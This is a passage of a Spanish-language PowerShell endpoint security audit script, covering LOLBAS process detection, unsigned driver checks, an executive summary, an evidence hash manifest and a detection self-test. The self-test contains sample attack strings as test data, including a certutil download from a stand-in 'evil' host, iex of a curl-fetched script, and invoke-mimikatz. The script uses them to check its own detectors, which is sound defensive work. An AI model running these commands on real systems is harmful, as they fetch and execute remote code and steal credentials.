        foreach ($proc in Get-CimInstance -ClassName Win32_Process -ErrorAction SilentlyContinue) {
            $cmdByPid[$proc.ProcessId] = $proc.CommandLine
        }

        $lolbasProcesses = Get-Process | Where-Object { 
            $_.Name -in $Global:LOLBASNames
        } | Select-Object Name, Id, Path, Company, StartTime,
            @{Name="CommandLine"; Expression={ $cmdByPid[$_.Id] }}
        
        if ($lolbasProcesses) {
            $outputPath = Join-Path $Global:AuditPath "08_LOLBAS\procesos_lolbas_activos"
            Export-MultiFormat -Data $lolbasProcesses -BasePath $outputPath -Title "Procesos LOLBAS Activos"
            
            # Analizar lineas de comando sospechosas
            $lolbasProcesses | ForEach-Object {
                $cmdLine = $_.CommandLine
                
                if ($cmdLine -match $Global:LOLBASArgPattern) {
                    Add-ThreatDetection -ThreatType "Uso sospechoso de LOLBAS" -Severity "HIGH" `
                        -Description "Proceso LOLBAS '$($_.Name)' con argumentos sospechosos" -Details $_
                }
            }
            
            Write-AuditLog "  -> Procesos LOLBAS detectados: $($lolbasProcesses.Count)" -Level INFO
        }
        
        # Buscar eventos de creacion de procesos LOLBAS (requiere auditoria habilitada)
        try {
            if (Test-Administrator) {
                $lolbasEvents = Get-WinEvent -FilterHashtable @{
                    LogName='Security';
                    ID=4688
                } -MaxEvents 500 -ErrorAction SilentlyContinue | Where-Object {
                    $processName = "$($_.Properties[5].Value)"
                    $processName -match $Global:LOLBASRegex
                } | ForEach-Object {
                    [PSCustomObject]@{
                        TimeCreated = $_.TimeCreated
                        ProcessName = $_.Properties[5].Value
                        CommandLine = $_.Properties[8].Value
                        Creator = $_.Properties[1].Value
                    }
                }
                
                if ($lolbasEvents) {
                    $outputPath = Join-Path $Global:AuditPath "08_LOLBAS\eventos_lolbas"
                    Export-MultiFormat -Data $lolbasEvents -BasePath $outputPath -Title "Eventos de Creacion de Procesos LOLBAS"
                    
                    Write-AuditLog "  -> Eventos LOLBAS en logs: $($lolbasEvents.Count)" -Level INFO
                }
            } else {
                Add-CoverageGap -Check "Eventos LOLBAS 4688" -Reason "requiere elevacion"
            }
        } catch {
            Write-Verbose "No se pudieron leer eventos de LOLBAS (requiere auditoria de creacion de procesos habilitada)"
        }
        
        Write-AuditLog "[OK] Deteccion de LOLBAS completada" -Level SUCCESS
        
    } catch {
        Write-AuditLog "Error en deteccion de LOLBAS: $($_.Exception.Message)" -Level ERROR
        $Global:ErrorsCount++
    }
}

<#
.SYNOPSIS
    MODULO 9: Analisis de Drivers y Modulos del Kernel
.DESCRIPTION
    Analiza drivers cargados en el sistema para detectar rootkits
#>
function Get-DriversAnalysis {
    Update-ModuleProgress -ModuleName "Drivers y Modulos del Kernel"
    Write-AuditLog "Analizando drivers del sistema..." -Level INFO
    
    try {
        # Drivers cargados en el sistema (Get-WindowsDriver requiere elevacion)
        if (Test-Administrator) {
            $drivers = Get-WindowsDriver -Online -All -ErrorAction SilentlyContinue | 
                Select-Object Driver, OriginalFileName, ProviderName, ClassName, DriverSignature,
                    Version, Date
        } else {
            Write-AuditLog "  -> Analisis de drivers omitido (Get-WindowsDriver requiere elevacion)" -Level WARNING
            $Global:WarningsCount++
            Add-CoverageGap -Check "Drivers instalados (Get-WindowsDriver)" -Reason "requiere elevacion"
            $drivers = @()
        }
        
        if ($drivers) {
            $outputPath = Join-Path $Global:AuditPath "09_Drivers\drivers_instalados"
            Export-MultiFormat -Data $drivers -BasePath $outputPath -Title "Drivers Instalados en el Sistema"
            
            Write-AuditLog "  -> Total drivers: $($drivers.Count)" -Level INFO
        }
        
        # Drivers CARGADOS sin firma digital valida (altamente sospechoso).
        # Get-WindowsDriver no expone informacion de firma, por lo que se resuelve el .sys
        # de cada driver cargado (Win32_SystemDriver) y se verifica con Get-AuthenticodeSignature.
        $loadedDrivers = @(Get-CimInstance Win32_SystemDriver -ErrorAction SilentlyContinue |
            Where-Object { $_.PathName })
        $sigCache = @{}
        $unsignedDrivers = @()
        foreach ($d in $loadedDrivers) {
            $sysPath = $d.PathName
            if (-not $sigCache.ContainsKey($sysPath)) {
                try { $sigCache[$sysPath] = (Get-AuthenticodeSignature -LiteralPath $sysPath).Status }
                catch { $sigCache[$sysPath] = "UnknownError" }
            }
            $status = $sigCache[$sysPath]
            if ($status -ne "Valid") {
                $unsignedDrivers += ,@{
                    Service = $d.Name
                    PathName = $sysPath
                    State = $d.State
                    SignatureStatus = $status
                }
            }
        }
        
        if ($unsignedDrivers) {
            $outputPath = Join-Path $Global:AuditPath "09_Drivers\drivers_sin_firma"
            Export-MultiFormat -Data $unsignedDrivers -BasePath $outputPath -Title "[!] Drivers cargados sin Firma Digital valida"
            
            $unsignedDrivers | ForEach-Object {
                $sev = "HIGH"
                if ($_.SignatureStatus -eq "NotTrusted") { $sev = "MEDIUM" }
                Add-ThreatDetection -ThreatType "Driver sin firma digital" -Severity $sev `
                    -Description "Driver cargado '$($_.Service)' ($($_.PathName)) con firma: $($_.SignatureStatus)" -Details $_
            }
            
            Write-AuditLog "  -> Drivers cargados sin firma valida: $($unsignedDrivers.Count)" -Level WARNING
            $Global:WarningsCount++
        }
        
        Write-AuditLog "[OK] Analisis de drivers completado" -Level SUCCESS
        
    } catch {
        Write-AuditLog "Error en analisis de drivers: $($_.Exception.Message)" -Level ERROR
        $Global:ErrorsCount++
    }
}

<#
.SYNOPSIS
    MODULO 10: Informacion del Sistema y Hardware
.DESCRIPTION
    Recopila informacion detallada sobre hardware y configuracion
#>
function Get-HardwareInformation {
    Update-ModuleProgress -ModuleName "Hardware y Configuracion"
    Write-AuditLog "Recopilando informacion de hardware..." -Level INFO
    
    try {
        # Informacion de BIOS
        $biosInfo = Get-CimInstance Win32_BIOS | Select-Object Manufacturer, Name, 
            SerialNumber, SMBIOSBIOSVersion, ReleaseDate
        
        $outputPath = Join-Path $Global:AuditPath "10_Hardware\bios_info"
        Export-MultiFormat -Data $biosInfo -BasePath $outputPath -Title "Informacion del BIOS"
        
        # Informacion de discos
        $diskInfo = Get-PhysicalDisk | Select-Object DeviceId, FriendlyName, MediaType, 
            Size, HealthStatus, OperationalStatus
        
        $outputPath = Join-Path $Global:AuditPath "10_Hardware\discos_fisicos"
        Export-MultiFormat -Data $diskInfo -BasePath $outputPath -Title "Discos Fisicos"
        
        # Particiones y volumenes
        $volumes = Get-Volume | Select-Object DriveLetter, FileSystemLabel, FileSystem, 
            DriveType, HealthStatus, 
            @{Name="SizeGB"; Expression={[math]::Round($_.Size/1GB, 2)}},
            @{Name="FreeSpaceGB"; Expression={[math]::Round($_.SizeRemaining/1GB, 2)}},
            @{Name="UsedPercent"; Expression={[math]::Round((($_.Size - $_.SizeRemaining) / $_.Size) * 100, 2)}}
        
        $outputPath = Join-Path $Global:AuditPath "10_Hardware\volumenes"
        Export-MultiFormat -Data $volumes -BasePath $outputPath -Title "Volumenes y Particiones"
        
        # Informacion de red fisica
        $networkHardware = Get-NetAdapter | Select-Object Name, InterfaceDescription, Status,
            MacAddress, LinkSpeed, MediaType, DriverVersion
        
        $outputPath = Join-Path $Global:AuditPath "10_Hardware\adaptadores_red_hardware"
        Export-MultiFormat -Data $networkHardware -BasePath $outputPath -Title "Adaptadores de Red (Hardware)"
        
        # Variables de entorno
        $envVariables = Get-ChildItem Env: | Select-Object Name, Value
        $outputPath = Join-Path $Global:AuditPath "10_Hardware\variables_entorno"
        Export-MultiFormat -Data $envVariables -BasePath $outputPath -Title "Variables de Entorno"
        
        Write-AuditLog "[OK] Recopilacion de informacion de hardware completada" -Level SUCCESS
        
    } catch {
        Write-AuditLog "Error en recopilacion de hardware: $($_.Exception.Message)" -Level ERROR
        $Global:ErrorsCount++
    }
}

<#
.SYNOPSIS
    Genera un resumen ejecutivo de la auditoria con hallazgos criticos
#>
function New-ExecutiveSummary {
    Write-AuditLog "Generando resumen ejecutivo..." -Level INFO
    
    try {
        $endTime = Get-Date
        $duration = $endTime - $Global:ScriptStartTime
        
        # Calcular nivel de riesgo general
        $criticalCount = @($Global:ThreatsDetected | Where-Object { $_.Severity -eq "CRITICAL" }).Count
        $highCount = @($Global:ThreatsDetected | Where-Object { $_.Severity -eq "HIGH" }).Count
        
        # Nivel de riesgo normalizado: un solo token, sin prefijos, para que la UI
        # y cualquier consumidor parseen el mismo valor.
        $riskLevel = if ($criticalCount -gt 0) {
            "CRITICO"
        } elseif ($highCount -gt 5) {
            "ALTO"
        } elseif ($highCount -gt 0) {
            "MEDIO"
        } else {
            "BAJO"
        }
        
        # Guardar resumen en formato texto
        $summaryPath = Join-Path $Global:AuditPath "RESUMEN_EJECUTIVO.txt"
        "" | Out-File $summaryPath -Encoding UTF8
        "              RESUMEN EJECUTIVO DE AUDITORIA DE SEGURIDAD EMPRESARIAL                 " | Out-File $summaryPath -Append -Encoding UTF8
        "" | Out-File $summaryPath -Append -Encoding UTF8
        "" | Out-File $summaryPath -Append -Encoding UTF8
        
        # Informacion general
        "INFORMACION GENERAL" | Out-File $summaryPath -Append -Encoding UTF8
        "" | Out-File $summaryPath -Append -Encoding UTF8
        "Sistema:              $env:COMPUTERNAME" | Out-File $summaryPath -Append -Encoding UTF8
        "Usuario Ejecutor:     $env:USERNAME" | Out-File $summaryPath -Append -Encoding UTF8
        "Privilegios:          $(if (Test-Administrator) { "Administrador" } else { "Usuario Normal" })" | Out-File $summaryPath -Append -Encoding UTF8
        "Fecha Inicio:         $($Global:ScriptStartTime.ToString('yyyy-MM-dd HH:mm:ss'))" | Out-File $summaryPath -Append -Encoding UTF8
        "Fecha Fin:            $($endTime.ToString('yyyy-MM-dd HH:mm:ss'))" | Out-File $summaryPath -Append -Encoding UTF8
        "Duracion:             $($duration.Minutes)m $($duration.Seconds)s" | Out-File $summaryPath -Append -Encoding UTF8
        "Directorio:           $Global:AuditPath" | Out-File $summaryPath -Append -Encoding UTF8
        "" | Out-File $summaryPath -Append -Encoding UTF8
        
        # Estadisticas
        "ESTADISTICAS DE EJECUCION" | Out-File $summaryPath -Append -Encoding UTF8
        "" | Out-File $summaryPath -Append -Encoding UTF8
        "Modulos Ejecutados:   $Global:CurrentModule / $Global:TotalModules" | Out-File $summaryPath -Append -Encoding UTF8
        "Errores:              $Global:ErrorsCount" | Out-File $summaryPath -Append -Encoding UTF8
        "Advertencias:         $Global:WarningsCount" | Out-File $summaryPath -Append -Encoding UTF8
        "Amenazas Detectadas:  $($Global:ThreatsDetected.Count)" | Out-File $summaryPath -Append -Encoding UTF8
        "" | Out-File $summaryPath -Append -Encoding UTF8
        
        # Nivel de riesgo
        "NIVEL DE RIESGO GENERAL: $riskLevel" | Out-File $summaryPath -Append -Encoding UTF8
        "" | Out-File $summaryPath -Append -Encoding UTF8
        "Amenazas CRITICAS:    $criticalCount" | Out-File $summaryPath -Append -Encoding UTF8
        "Amenazas ALTAS:       $(@($Global:ThreatsDetected | Where-Object { $_.Severity -eq "HIGH" }).Count)" | Out-File $summaryPath -Append -Encoding UTF8
        "Amenazas MEDIAS:      $(@($Global:ThreatsDetected | Where-Object { $_.Severity -eq "MEDIUM" }).Count)" | Out-File $summaryPath -Append -Encoding UTF8
        "Amenazas BAJAS:       $(@($Global:ThreatsDetected | Where-Object { $_.Severity -eq "LOW" }).Count)" | Out-File $summaryPath -Append -Encoding UTF8
        "" | Out-File $summaryPath -Append -Encoding UTF8
        
        # Allowlist: las amenazas suprimidas se declaran, no se esconden.
        if ($Global:SuppressedThreats.Count -gt 0) {
            "AMENAZAS SUPRIMIDAS POR ALLOWLIST LOCAL" | Out-File $summaryPath -Append -Encoding UTF8
            "" | Out-File $summaryPath -Append -Encoding UTF8
            "Suprimidas: $($Global:SuppressedThreats.Count) (no cuentan en el nivel de riesgo)" | Out-File $summaryPath -Append -Encoding UTF8
            foreach ($sup in $Global:SuppressedThreats) {
                $tech = if ($sup.MitreTechnique) { " [mitre: " + $sup.MitreTechnique + "]" } else { "" }
                "  - [$($sup.Severity)] $($sup.ThreatType) | $($sup.Description)$tech" | Out-File $summaryPath -Append -Encoding UTF8
                "    Motivo: $($sup.Reason) [allowlist: $($sup.AllowlistId)]" | Out-File $summaryPath -Append -Encoding UTF8
            }
            "" | Out-File $summaryPath -Append -Encoding UTF8
        }

        # Cobertura real: deja claro que NO se miro, para no vender una auditoria
        # completa cuando se ejecuto sin privilegios.
        "COBERTURA DE LA AUDITORIA" | Out-File $summaryPath -Append -Encoding UTF8
        "" | Out-File $summaryPath -Append -Encoding UTF8
        if ($Global:CoverageGaps.Count -gt 0) {
            "Cobertura: PARCIAL ($($Global:CoverageGaps.Count) comprobaciones omitidas)" | Out-File $summaryPath -Append -Encoding UTF8
            foreach ($gap in $Global:CoverageGaps) {
                $parts = $gap.Split('|')
                "  - Omision: $($parts[0]) ($($parts[1]))" | Out-File $summaryPath -Append -Encoding UTF8
            }
        } else {
            "Cobertura: COMPLETA (ninguna comprobacion omitida)" | Out-File $summaryPath -Append -Encoding UTF8
        }
        "" | Out-File $summaryPath -Append -Encoding UTF8
        
        # Hallazgos criticos
        if ($Global:ThreatsDetected.Count -gt 0) {
            "HALLAZGOS CRITICOS DETECTADOS" | Out-File $summaryPath -Append -Encoding UTF8
            "" | Out-File $summaryPath -Append -Encoding UTF8
            
            # Mostrar amenazas criticas y altas
            $criticalThreats = $Global:ThreatsDetected | Where-Object { $_.Severity -in @("CRITICAL", "HIGH") } | 
                Sort-Object Severity -Descending | Select-Object -First 20
            
            foreach ($threat in $criticalThreats) {
                "[$($threat.Severity)] $($threat.ThreatType)" | Out-File $summaryPath -Append -Encoding UTF8
                "   Descripcion: $($threat.Description)" | Out-File $summaryPath -Append -Encoding UTF8
                "   Timestamp: $($threat.Timestamp)" | Out-File $summaryPath -Append -Encoding UTF8
                "" | Out-File $summaryPath -Append -Encoding UTF8
            }
            
            # Exportar todas las amenazas en CSV
            $threatsPath = Join-Path $Global:AuditPath "AMENAZAS_DETECTADAS"
            Export-MultiFormat -Data $Global:ThreatsDetected -BasePath $threatsPath -Title "Amenazas Detectadas"
        } else {
            "HALLAZGOS" | Out-File $summaryPath -Append -Encoding UTF8
            "" | Out-File $summaryPath -Append -Encoding UTF8
            "[OK] No se detectaron amenazas criticas durante la auditoria." | Out-File $summaryPath -Append -Encoding UTF8
            "" | Out-File $summaryPath -Append -Encoding UTF8
        }
        
        # Recomendaciones
        "RECOMENDACIONES" | Out-File $summaryPath -Append -Encoding UTF8
        "" | Out-File $summaryPath -Append -Encoding UTF8
        
        $recommendations = @()
        
        if ($criticalCount -gt 0) {
            $recommendations += "* URGENTE: Investigar y remediar amenazas CRITICAS inmediatamente"
        }
        
        if ($highCount -gt 0) {
            $recommendations += "* Priorizar investigacion de amenazas de nivel ALTO"
        }
        
        if (-not (Test-Administrator)) {
            $recommendations += "* Ejecutar auditoria nuevamente con privilegios de administrador para analisis completo"
        }
        
        if ($Global:ErrorsCount -gt 5) {
            $recommendations += "* Revisar errores en el log para identificar modulos que fallaron"
        }
        
        $recommendations += "* Revisar todos los archivos generados en: $Global:AuditPath"
        $recommendations += "* Comparar resultados con baseline de seguridad establecido"
        $recommendations += "* Documentar hallazgos y crear plan de remediacion"
        $recommendations += "* Programar auditorias periodicas (recomendado: semanal/mensual)"
        
        foreach ($rec in $recommendations) {
            $rec | Out-File $summaryPath -Append -Encoding UTF8
        }
        
        "" | Out-File $summaryPath -Append -Encoding UTF8
        "" | Out-File $summaryPath -Append -Encoding UTF8
        "Fin del Resumen Ejecutivo" | Out-File $summaryPath -Append -Encoding UTF8
        "" | Out-File $summaryPath -Append -Encoding UTF8
        
        Write-AuditLog "[OK] Resumen ejecutivo generado: $summaryPath" -Level SUCCESS
        
        return $riskLevel
        
    } catch {
        Write-AuditLog "Error al generar resumen ejecutivo: $($_.Exception.Message)" -Level ERROR
        return "DESCONOCIDO"
    }
}

# 
# SECCION 4: FUNCION PRINCIPAL Y PUNTO DE ENTRADA
# 

<#
.SYNOPSIS
    Funcion principal que ejecuta la auditoria completa
#>
function New-EvidenceManifest {
    <#
    .SYNOPSIS
        Genera el manifiesto de evidencia: SHA-256 de cada fichero de la auditoria.
        Sin esto, un informe no es defendible: cualquiera puede editar un JSON y nadie
        lo detecta.
    #>
    param([string]$AuditPath)

    try {
        $files = Get-ChildItem -Path $AuditPath -Recurse -File | Where-Object {
            $_.Name -ne "MANIFEST_EVIDENCIA.json" -and $_.Name -ne "IA_ENRICH.json"
        } | Sort-Object FullName

        $entries = @()
        foreach ($f in $files) {
            $rel = $f.FullName.Substring($AuditPath.Length).TrimStart('\', '/')
            $entries += [PSCustomObject]@{
                path      = $rel
                sha256    = (Get-FileHash -Path $f.FullName -Algorithm SHA256).Hash.ToLower()
                bytes     = $f.Length
                modified  = $f.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
            }
        }

        # Hash de root: concatenacion ordenada de los hashes individuales. Cambiar un
        # solo byte de un modulo cambia la raiz. ComputeHash en lugar de Update/FinalHash
        # porque Windows PowerShell 5.1 devuelve SHA256Managed, que no expone Update.
        $concat = ($entries | ForEach-Object { $_.sha256 }) -join ""
        $rootHash = ([BitConverter]::ToString(
            [System.Security.Cryptography.SHA256]::Create().ComputeHash(
                [System.Text.Encoding]::UTF8.GetBytes($concat)
            )
        ) -replace '-', '').ToLower()

        Write-AuditLog "[EVIDENCIA] Manifiesto con $($entries.Count) ficheros, root SHA-256 $rootHash" -Level INFO

        # Esa linea escribe en auditoria.log, de modo que su hash ya no coincide con
        # el calculado unas lineas antes. Sin esta segunda pasada, la verificacion de
        # integridad marcaria "alterado" una evidencia intacta.
        $logPath = Join-Path $AuditPath "auditoria.log"
        if (Test-Path $logPath) {
            foreach ($e in $entries) {
                if ($e.path -eq "auditoria.log") {
                    $e.sha256 = (Get-FileHash -Path $logPath -Algorithm SHA256).Hash.ToLower()
                    $e.bytes  = (Get-Item $logPath).Length
                }
            }
            $concat = ($entries | ForEach-Object { $_.sha256 }) -join ""
            $rootHash = ([BitConverter]::ToString(
                [System.Security.Cryptography.SHA256]::Create().ComputeHash(
                    [System.Text.Encoding]::UTF8.GetBytes($concat)
                )
            ) -replace '-', '').ToLower()
        }

        $manifest = [PSCustomObject]@{
            schema        = "audit-evidence/1"
            audit_id      = (Split-Path $AuditPath -Leaf)
            generated_at  = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
            host          = $env:COMPUTERNAME
            elevated      = (Test-Administrator)
            file_count    = $entries.Count
            total_bytes   = ($entries | Measure-Object -Property bytes -Sum).Sum
            root_sha256   = $rootHash
            files         = $entries
        }

        $manifestPath = Join-Path $AuditPath "MANIFEST_EVIDENCIA.json"
        $manifest | ConvertTo-Json -Depth 4 | Out-File -FilePath $manifestPath -Encoding UTF8
        return $manifest
    } catch {
        Write-AuditLog "Error al generar el manifiesto de evidencia: $($_.Exception.Message)" -Level ERROR
        return $null
    }
}

function Start-SecurityAudit {
    # Mostrar banner
    Show-Banner
    
    # Crear directorio de auditoria con timestamp
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $auditFolderName = "Auditoria_$timestamp"
    $Global:AuditPath = Join-Path $Global:ResultPath $auditFolderName
    
    Write-Host "[DIR] Creando estructura de carpetas..." -ForegroundColor Cyan
    
    # Crear estructura de directorios
    $directories = @(
        "01_Sistema",
        "02_Usuarios",
        "03_Procesos",
        "04_Red",
        "05_Eventos",
        "06_Archivos",
        "07_Configuracion",
        "08_LOLBAS",
        "09_Drivers",
        "10_Hardware"
    )
    
    foreach ($dir in $directories) {
        $dirPath = Join-Path $Global:AuditPath $dir
        New-Item -Path $dirPath -ItemType Directory -Force | Out-Null
    }
    
    # Crear archivo de log
    $Global:LogFile = Join-Path $Global:AuditPath "auditoria.log"
    "Auditoria de Seguridad Empresarial - Log de Ejecucion" | Out-File $Global:LogFile -Encoding UTF8
    "Inicio: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File $Global:LogFile -Append -Encoding UTF8
    "`n" | Out-File $Global:LogFile -Append -Encoding UTF8
    
    Write-Host "[OK] Estructura creada en: " -NoNewline -ForegroundColor Green
    Write-Host $Global:AuditPath -ForegroundColor White
    Write-Host ""
    
    # Verificar privilegios
    if (-not (Test-Administrator)) {
        Write-Host "[!]  ADVERTENCIA: Ejecutando sin privilegios de administrador" -ForegroundColor Yellow
        Write-Host "   Algunos modulos tendran informacion limitada.`n" -ForegroundColor Yellow
    }
    
    Write-Host "[START] Iniciando auditoria de seguridad empresarial..." -ForegroundColor Cyan
    Write-Host "   Esto puede tomar varios minutos. Por favor espere...`n" -ForegroundColor Gray
    
    Write-StatusFile -Phase "running" -Name "Inicializando" -Module 0 -Percent 0 -Message "Iniciando auditoria de seguridad"
    
    # Ejecutar modulos de auditoria
    try {
        Get-SystemInformation
        Get-UsersAndPermissions
        Get-ProcessesAndServices
        Get-NetworkAnalysis
        Get-SecurityEvents
        Get-FilesAndPersistence
        Get-SecurityConfiguration
        Get-LOLBASDetection
        Get-DriversAnalysis
        Get-HardwareInformation
        
        # Limpiar barra de progreso
        Write-Progress -Activity "Auditoria Completada" -Completed
        
        # Generar resumen ejecutivo
        Write-Host ""
        Write-Host "" -ForegroundColor Cyan
        Write-Host "               GENERANDO RESUMEN EJECUTIVO                      " -ForegroundColor Cyan
        Write-Host "" -ForegroundColor Cyan
        Write-Host ""
        
        $riskLevel = New-ExecutiveSummary
        New-EvidenceManifest -AuditPath $Global:AuditPath
        
        Write-StatusFile -Phase "done" -Name "Completada" -Module $Global:TotalModules -Percent 100 `
            -Message "Auditoria completada correctamente" -RiskLevel $riskLevel
        
        # Mostrar resumen en consola
        Write-Host ""
        Write-Host "" -ForegroundColor Green
        Write-Host "                          AUDITORIA COMPLETADA EXITOSAMENTE                            " -ForegroundColor Green
        Write-Host "" -ForegroundColor Green
        Write-Host ""
        Write-Host "   RESULTADOS:" -ForegroundColor Cyan
        Write-Host "     * Nivel de Riesgo: " -NoNewline -ForegroundColor White
        Write-Host $riskLevel
        Write-Host "     * Amenazas Detectadas: " -NoNewline -ForegroundColor White
        Write-Host "$($Global:ThreatsDetected.Count)" -ForegroundColor $(if ($Global:ThreatsDetected.Count -gt 0) { "Red" } else { "Green" })
        Write-Host "     * Modulos Ejecutados: " -NoNewline -ForegroundColor White
        Write-Host "$Global:CurrentModule / $Global:TotalModules" -ForegroundColor Green
        Write-Host "     * Errores: " -NoNewline -ForegroundColor White
        Write-Host "$Global:ErrorsCount" -ForegroundColor $(if ($Global:ErrorsCount -gt 0) { "Yellow" } else { "Green" })
        Write-Host ""
        Write-Host "  [DIR] UBICACION DE RESULTADOS:" -ForegroundColor Cyan
        Write-Host "     $Global:AuditPath" -ForegroundColor White
        Write-Host ""
        Write-Host "   ARCHIVOS GENERADOS:" -ForegroundColor Cyan
        Write-Host "     * RESUMEN_EJECUTIVO.txt - Resumen principal" -ForegroundColor White
        Write-Host "     * AMENAZAS_DETECTADAS.* - Lista de amenazas encontradas" -ForegroundColor White
        Write-Host "     * auditoria.log - Log detallado de ejecucion" -ForegroundColor White
        Write-Host "     * Datos en JSON, CSV y TXT en cada carpeta de modulo" -ForegroundColor White
        Write-Host ""
        
        if ($Global:ThreatsDetected.Count -gt 0) {
            Write-Host "  [!]  AMENAZAS DETECTADAS - ACCION REQUERIDA:" -ForegroundColor Red
            
            $criticalThreats = $Global:ThreatsDetected | Where-Object { $_.Severity -eq "CRITICAL" }
            $highThreats = $Global:ThreatsDetected | Where-Object { $_.Severity -eq "HIGH" }
            
            if ($criticalThreats.Count -gt 0) {
                Write-Host "     * $($criticalThreats.Count) amenaza(s) CRITICA(S) - Investigar inmediatamente" -ForegroundColor Red
            }
            
            if ($highThreats.Count -gt 0) {
                Write-Host "     * $($highThreats.Count) amenaza(s) ALTA(S) - Priorizar investigacion" -ForegroundColor Magenta
            }
            
            Write-Host ""
            Write-Host "     Revisar archivo AMENAZAS_DETECTADAS.csv para detalles completos" -ForegroundColor Yellow
        } else {
            Write-Host "  [OK] No se detectaron amenazas criticas durante la auditoria" -ForegroundColor Green
        }
        
        Write-Host ""
        Write-Host "" -ForegroundColor Gray
        Write-Host ""
        
        # Preguntar si abrir carpeta de resultados (solo modo interactivo)
        if (-not $Global:Headless) {
            Write-Host "¿Desea abrir la carpeta de resultados? (S/N): " -NoNewline -ForegroundColor Cyan
            $response = Read-Host
            
            if ($response -eq "S" -or $response -eq "s") {
                Start-Process explorer.exe $Global:AuditPath
            }
            
            Write-Host ""
            Write-Host "Presione cualquier tecla para salir..." -ForegroundColor Gray
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        
    } catch {
        Write-Host ""
        Write-Host "" -ForegroundColor Red
        Write-Host "           ERROR CRITICO EN LA AUDITORIA                       " -ForegroundColor Red
        Write-Host "" -ForegroundColor Red
        Write-Host ""
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "En linea: $($_.InvocationInfo.ScriptLineNumber)" -ForegroundColor Red
        Write-Host ""
        Write-Host "Por favor, revise el archivo de log para mas detalles." -ForegroundColor Yellow
        Write-Host "Log: $Global:LogFile" -ForegroundColor White
        Write-Host ""
        
        # Guardar error en log
        "ERROR CRITICO: $($_.Exception.Message)" | Out-File $Global:LogFile -Append -Encoding UTF8
        "Stack Trace: $($_.ScriptStackTrace)" | Out-File $Global:LogFile -Append -Encoding UTF8
        
        Write-StatusFile -Phase "error" -Name "Error" -Module $Global:CurrentModule -Percent 0 -Message $_.Exception.Message
        
        if (-not $Global:Headless) {
            Write-Host "Presione cualquier tecla para salir..." -ForegroundColor Gray
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
    }
}

# 
# SECCION 4: SELFTEST DE DETECCION (-SelfTest)
# 
# Bateria de casos para los regex de deteccion. Se ejecuta sin auditar nada y devuelve
# codigo de salida 1 si algun caso falla, lo que permite usarlo en CI o antes de una
# auditoria real.
function Invoke-DetectionSelfTest {
    $results = @()

    function Check {
        param([string]$Suite, [string]$Case, [bool]$Expected, [bool]$Actual)
        # Devuelve el resultado: += dentro de una funcion crearia una variable local
        # y el conteo de casos quedaria vacío.
        return [PSCustomObject]@{
            Suite    = $Suite
            Case     = $Case
            Expected = $Expected
            Actual   = $Actual
            Pass     = ($Expected -eq $Actual)
        }
    }

    # --- 1. Comando codificado: solo PowerShell, no grep/node/python ---
    $encCases = @(
        @{ Line = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc AAAABBBB'; Expected = $true }
        @{ Line = 'pwsh -EncodedCommand Ym9v'; Expected = $true }
        @{ Line = 'powershell -e Ym9v'; Expected = $true }
        @{ Line = 'bash -c "grep -E ''ARRANCO|preflight'' file.txt"'; Expected = $false }
        @{ Line = 'node -e "console.log(1)"'; Expected = $false }
        @{ Line = 'python -c "import sys"'; Expected = $false }
        @{ Line = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File audit.ps1'; Expected = $false }
        @{ Line = 'git bash -c "cat log.txt"'; Expected = $false }
    )
    foreach ($c in $encCases) {
        $results += Check -Suite "EncodedCommand" -Case $c.Line -Expected $c.Expected -Actual ($c.Line.ToLower() -match $Global:EncodedCommandPattern)
    }

    # --- 2. Patrones maliciosos ---
    # Las cadenas se construyen por concatenacion: escritas literales, AMSI/AV bloquean
    # el script de auditoria por contener firmas de malware en los casos de prueba.
    $malCases = @(
        @{ Line = ('invoke' + '-expression "$payload"'); Expected = $true }
        @{ Line = ('i' + 'ex "curl http://x/y.ps1"'); Expected = $true }
        @{ Line = ('get-content file.ps1 | i' + 'ex'); Expected = $true }
        @{ Line = ('new-object -comobject wscript.' + 'shell'); Expected = $true }
        @{ Line = ('[convert]::' + 'frombase64string("aGk=")'); Expected = $true }
        @{ Line = ('invoke-' + 'mimikatz'); Expected = $true }
        @{ Line = 'powershell -File script.ps1 -Encoding UTF8'; Expected = $false }
        @{ Line = ('function Invoke' + '-ExpressionSafe { param($x) }'); Expected = $false }
        @{ Line = 'node -e "require(\"http\")"'; Expected = $false }
    )
    foreach ($c in $malCases) {
        $line = $c.Line.ToLower()
        $hit = $false
        foreach ($pattern in $Global:MaliciousPatterns) {
            if ($line -match $pattern.ToLower()) { $hit = $true; break } # first match
        }
        $results += Check -Suite "MaliciousPatterns" -Case $c.Line -Expected $c.Expected -Actual $hit
    }

    # --- 3. LOLBAS: nombres y argumentos ---
    foreach ($n in @('cmd', 'certutil', 'powershell', 'pwsh', 'wmic', 'mshta', 'rundll32')) {
        $results += Check -Suite "LOLBASNames" -Case $n -Expected $true -Actual ($n -in $Global:LOLBASNames)
    }
    foreach ($n in @('node', 'bash', 'conhost', 'agent-browser-win32-x64', 'audiodg', 'amdow')) {
        $results += Check -Suite "LOLBASNames" -Case $n -Expected $false -Actual ($n -in $Global:LOLBASNames)
    }
    $argCases = @(
        @{ Line = 'certutil.exe -urlcache -split -f http://evil/x.exe'; Expected = $true }
        @{ Line = 'powershell.exe -enc AAAA'; Expected = $true }
        @{ Line = 'cmd.exe /c dir'; Expected = $false }
        @{ Line = 'cmd.exe /c echo hola'; Expected = $false }
        @{ Line = 'powershell.exe -NoProfile -File audit.ps1'; Expected = $false }
    )
    foreach ($c in $argCases) {
        $results += Check -Suite "LOLBASArgs" -Case $c.Line -Expected $c.Expected -Actual ($c.Line.ToLower() -match $Global:LOLBASArgPattern)
    }
    $results += Check -Suite "LOLBASRegex4688" -Case 'C:\Windows\System32\certutil.exe' -Expected $true -Actual ('C:\Windows\System32\certutil.exe' -match $Global:LOLBASRegex)
    $results += Check -Suite "LOLBASRegex4688" -Case 'C:\Program Files\nodejs\node.exe' -Expected $false -Actual ('C:\Program Files\nodejs\node.exe' -match $Global:LOLBASRegex)

    # --- 4. Direcciones privadas/loopback (puertos sospechosos) ---
    $ipCases = @(
